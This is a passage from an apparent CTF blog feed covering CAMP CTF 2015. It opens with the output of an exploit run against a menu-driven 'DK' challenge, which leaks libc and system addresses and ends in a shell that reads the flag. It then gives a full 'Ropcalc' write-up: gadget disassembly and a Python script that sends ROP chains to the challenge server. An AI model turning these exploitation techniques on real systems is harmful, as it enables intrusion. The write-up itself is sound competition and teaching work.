<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ubuntu@ubuntu-VirtualBox:~<span class="nv">$ </span>python poc.py
</span><span class='line'>dbg
</span><span class='line'>
</span><span class='line'>&gt; Does the DK have wifi?
</span><span class='line'>1<span class="o">)</span> Yes
</span><span class='line'>2<span class="o">)</span> No
</span><span class='line'>&gt; Please enter longitude * 10000:
</span><span class='line'>&gt; Please enter latitude * 10000:
</span><span class='line'>&gt; Please enter the number of ssids, this DK supports.
</span><span class='line'>&gt; Please enter a comment <span class="k">for</span> this DK.
</span><span class='line'>&gt; DK <span class="c">#0 successfully added.</span>
</span><span class='line'>Menu:
</span><span class='line'>1<span class="o">)</span> List DK<span class="s1">&#39;s</span>
</span><span class='line'><span class="s1">2) Add a DK</span>
</span><span class='line'><span class="s1">3) Remove a DK</span>
</span><span class='line'><span class="s1">4) Edit a DK</span>
</span><span class='line'><span class="s1">5) Exit</span>
</span><span class='line'><span class="s1">adding second wifi</span>
</span><span class='line'>
</span><span class='line'><span class="s1">&gt; Does the DK have wifi?</span>
</span><span class='line'><span class="s1">1) Yes</span>
</span><span class='line'><span class="s1">2) No</span>
</span><span class='line'><span class="s1">&gt; Please enter longitude * 10000:</span>
</span><span class='line'><span class="s1">&gt; Please enter latitude * 10000:</span>
</span><span class='line'><span class="s1">&gt; Please enter the number of ssids, this DK supports.</span>
</span><span class='line'><span class="s1">&gt; Please enter a comment for this DK.</span>
</span><span class='line'><span class="s1">&gt; DK #1 successfully added.</span>
</span><span class='line'><span class="s1">Menu:</span>
</span><span class='line'><span class="s1">1) List DK&#39;</span>s
</span><span class='line'>2<span class="o">)</span> Add a DK
</span><span class='line'>3<span class="o">)</span> Remove a DK
</span><span class='line'>4<span class="o">)</span> Edit a DK
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>libc: 7f912685f000
</span><span class='line'>system: 7f91268a33d0
</span><span class='line'>
</span><span class='line'> Comment:
</span><span class='line'>
</span><span class='line'>DK <span class="c">#1 with wifi @ 0.0000/0.0000:</span>
</span><span class='line'> Comment:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Menu:
</span><span class='line'>1<span class="o">)</span> List DK<span class="s1">&#39;s</span>
</span><span class='line'><span class="s1">2) Add a DK</span>
</span><span class='line'><span class="s1">3) Remove a DK</span>
</span><span class='line'><span class="s1">4) Edit a DK</span>
</span><span class='line'><span class="s1">5) Exit</span>
</span><span class='line'><span class="s1">deleting second wifi</span>
</span><span class='line'>
</span><span class='line'><span class="s1">&gt; Enter DK index: </span>
</span><span class='line'><span class="s1">&gt; DK #1 successfully deleted.</span>
</span><span class='line'><span class="s1">Menu:</span>
</span><span class='line'><span class="s1">1) List DK&#39;</span>s
</span><span class='line'>2<span class="o">)</span> Add a DK
</span><span class='line'>3<span class="o">)</span> Remove a DK
</span><span class='line'>4<span class="o">)</span> Edit a DK
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>shrinking first wifi
</span><span class='line'>
</span><span class='line'>&gt; Enter DK index:
</span><span class='line'>&gt; Editing DK <span class="c">#0:</span>
</span><span class='line'>Does the DK have wifi?
</span><span class='line'>1<span class="o">)</span> Yes
</span><span class='line'>2<span class="o">)</span> No
</span><span class='line'>3<span class="o">)</span> Do not change
</span><span class='line'>&gt; Please enter longitude * 10000:
</span><span class='line'>&gt; Please enter latitude * 10000:
</span><span class='line'>&gt; Please enter a comment <span class="k">for</span> this DK.
</span><span class='line'>&gt; DK <span class="c">#0 successfully saved.</span>
</span><span class='line'>Menu:
</span><span class='line'>1<span class="o">)</span> List DK<span class="s1">&#39;s</span>
</span><span class='line'><span class="s1">2) Add a DK</span>
</span><span class='line'><span class="s1">3) Remove a DK</span>
</span><span class='line'><span class="s1">4) Edit a DK</span>
</span><span class='line'><span class="s1">5) Exit</span>
</span><span class='line'><span class="s1">adding second nowifi</span>
</span><span class='line'>
</span><span class='line'><span class="s1">&gt; Does the DK have wifi?</span>
</span><span class='line'><span class="s1">1) Yes</span>
</span><span class='line'><span class="s1">2) No</span>
</span><span class='line'><span class="s1">&gt; Please enter longitude * 10000:</span>
</span><span class='line'><span class="s1">&gt; Please enter latitude * 10000:</span>
</span><span class='line'><span class="s1">&gt; Please enter a comment for this DK.</span>
</span><span class='line'><span class="s1">&gt; DK #1 successfully added.</span>
</span><span class='line'><span class="s1">Menu:</span>
</span><span class='line'><span class="s1">1) List DK&#39;</span>s
</span><span class='line'>2<span class="o">)</span> Add a DK
</span><span class='line'>3<span class="o">)</span> Remove a DK
</span><span class='line'>4<span class="o">)</span> Edit a DK
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>
</span><span class='line'>&gt; Enter DK index:
</span><span class='line'>&gt; Editing DK <span class="c">#0:</span>
</span><span class='line'>Does the DK have wifi?
</span><span class='line'>1<span class="o">)</span> Yes
</span><span class='line'>2<span class="o">)</span> No
</span><span class='line'>3<span class="o">)</span> Do not change
</span><span class='line'>&gt; Please enter longitude * 10000:
</span><span class='line'>&gt; Please enter latitude * 10000:
</span><span class='line'>&gt; Please enter the number of ssids, this DK supports.
</span><span class='line'>&gt; Please enter the name of SSID <span class="c">#0.</span>
</span><span class='line'>&gt; Please enter a comment <span class="k">for</span> this DK.
</span><span class='line'>&gt; DK <span class="c">#0 successfully saved.</span>
</span><span class='line'>Menu:
</span><span class='line'>1<span class="o">)</span> List DK<span class="err">&#39;</span>s
</span><span class='line'>2<span class="o">)</span> Add a DK
</span><span class='line'>3<span class="o">)</span> Remove a DK
</span><span class='line'>4<span class="o">)</span> Edit a DK
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>&gt; Enter DK index:
</span><span class='line'>&gt; Editing DK <span class="c">#1:</span>
</span><span class='line'>Does the DK have wifi?
</span><span class='line'>1<span class="o">)</span> Yes
</span><span class='line'>2<span class="o">)</span> No
</span><span class='line'>3<span class="o">)</span> Do not change
</span><span class='line'>&gt; id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>cat: flag.txt: No such file or directory
</span><span class='line'>ls
</span><span class='line'>bin
</span><span class='line'>boot
</span><span class='line'>dev
</span><span class='line'>etc
</span><span class='line'>home
</span><span class='line'>initrd.img
</span><span class='line'>initrd.img.old
</span><span class='line'>lib
</span><span class='line'>lib64
</span><span class='line'>lost+found
</span><span class='line'>media
</span><span class='line'>mnt
</span><span class='line'>opt
</span><span class='line'>proc
</span><span class='line'>root
</span><span class='line'>run
</span><span class='line'>sbin
</span><span class='line'>srv
</span><span class='line'>sys
</span><span class='line'>tmp
</span><span class='line'>usr
</span><span class='line'>var
</span><span class='line'>vmlinuz
</span><span class='line'>vmlinuz.old
</span><span class='line'><span class="nb">cd </span>home
</span><span class='line'>ls
</span><span class='line'>challenge
</span><span class='line'><span class="nb">cd </span>cha*
</span><span class='line'>ls
</span><span class='line'>challenge
</span><span class='line'>flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>CAMP15_aecbde52de8b1ed16bf62aa772d53a2
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Ropcalc]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc/"/>
    <updated>2015-08-18T21:35:34+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc</id>
    <content type="html"><![CDATA[<p>How could I resist a challenge called ropcalc?</p>

<!--more-->


<p>We&rsquo;re given the python server and a binary. We&rsquo;re supposed to write a ROP chain to satisfy certain conditions. The server.py will then pass random values for the registers to the binary, along with the ROP chain we provide. After execution of the ROP chain, it will check if the ROP chain has calculated the right answer. Pretty nifty, if you ask me!</p>

<p>The binary itself is actually packed with everything we need:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0000000000400b40 &lt;sub_rax_rbx&gt;:
</span><span class='line'>  400b40: sub    rax,rbx
</span><span class='line'>  400b43: ret    
</span><span class='line'>  400b44: data32 data32 nop WORD PTR cs:[rax+rax*1+0x0]
</span><span class='line'>
</span><span class='line'>0000000000400b50 &lt;imul_rax_rbx&gt;:
</span><span class='line'>  400b50: imul   rax,rbx
</span><span class='line'>  400b54: ret    
</span><span class='line'>  400b55: data32 nop WORD PTR cs:[rax+rax*1+0x0]
</span><span class='line'>
</span><span class='line'>0000000000400b60 &lt;xchg_rax_rbx&gt;:
</span><span class='line'>  400b60: xchg   rbx,rax
</span><span class='line'>  400b62: ret    
</span><span class='line'>  400b63: data32 data32 data32 nop WORD PTR cs:[rax+rax*1+0x0]</span></code></pre></td></tr></table></div></figure>


<p>The expressions we need to satisfy look like this: <code>$rax + $rbx + 1337 (store result in rax)</code></p>

<p>I&rsquo;ll just give the final exploit as it&rsquo;s not that difficult:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">toHex</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="si">%02x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">payload</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10109</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop1</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">rop1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00400b30</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x004046ab</span><span class="p">)</span> <span class="c"># ret</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">rop2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400900</span><span class="p">)</span> <span class="c"># pop_rcx</span>
</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1337</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b80</span><span class="p">)</span> <span class="c"># add rax, rcx</span>
</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b30</span><span class="p">)</span> <span class="c"># add rax, rbx</span>
</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span> <span class="c"># ret</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">rop3</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">rop3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b50</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">rop4</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400900</span><span class="p">)</span> <span class="c"># pop_rcx</span>
</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400f90</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b50</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop4</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># $rcx + 23 * $rax + $rbx - 42 * ($rcx - 5 * $rdx - $rdi * $rsi) - $r8 + 2015</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400a20</span><span class="p">)</span>  <span class="c"># pop r10</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">23</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400d80</span><span class="p">)</span> <span class="c"># imul rax, r10</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b80</span><span class="p">)</span> <span class="c"># add rax, rcx</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b30</span><span class="p">)</span> <span class="c"># add rax, rbx</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400cd0</span><span class="p">)</span> <span class="c"># sub rax, r8</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400a20</span><span class="p">)</span>  <span class="c"># pop r10</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">2015</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400d60</span><span class="p">)</span> <span class="c"># add rax, r10</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4020e0</span><span class="p">)</span> <span class="c"># imul rdi, rsi</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span> <span class="c"># pop r8</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401910</span><span class="p">)</span> <span class="c"># imul rdx, r8</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4018a0</span><span class="p">)</span> <span class="c"># add rdx, rdi</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401400</span><span class="p">)</span> <span class="c"># sub rcx, rdx</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span> <span class="c"># pop r8</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401500</span><span class="p">)</span> <span class="c"># imul rcx, r8</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b90</span><span class="p">)</span> <span class="c"># sub rax, rcx</span>
</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop5</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ccc</span><span class="o">/</span><span class="n">ropc</span><span class="err">$</span> <span class="n">python</span> <span class="n">poc3</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">2</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span> <span class="o">+</span> <span class="mi">1337</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">3</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">*</span> <span class="err">$</span><span class="n">rbx</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">4</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">*</span> <span class="p">(</span><span class="mi">31337</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span><span class="p">)</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">5</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rcx</span> <span class="o">+</span> <span class="mi">23</span> <span class="o">*</span> <span class="err">$</span><span class="n">rax</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span> <span class="o">-</span> <span class="mi">42</span> <span class="o">*</span> <span class="p">(</span><span class="err">$</span><span class="n">rcx</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="err">$</span><span class="n">rdx</span> <span class="o">-</span> <span class="err">$</span><span class="n">rdi</span> <span class="o">*</span> <span class="err">$</span><span class="n">rsi</span><span class="p">)</span> <span class="o">-</span> <span class="err">$</span><span class="n">r8</span> <span class="o">+</span> <span class="mi">2015</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
